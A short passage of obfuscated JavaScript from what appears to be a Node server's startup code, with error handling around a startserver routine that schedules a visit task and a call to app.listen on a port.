AddVisitTask();}catch(_0x4740db){console[_0x546773(0x1d5)]('Error\x20in\x20startserver:',_0x4740db);}}startserver()['catch'](_0x292d5f=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x292d5f);}),app['listen'](PORT,()=>console[_0x75151d(0x224)](_0x75151d(0x272)+PORT+'!'));
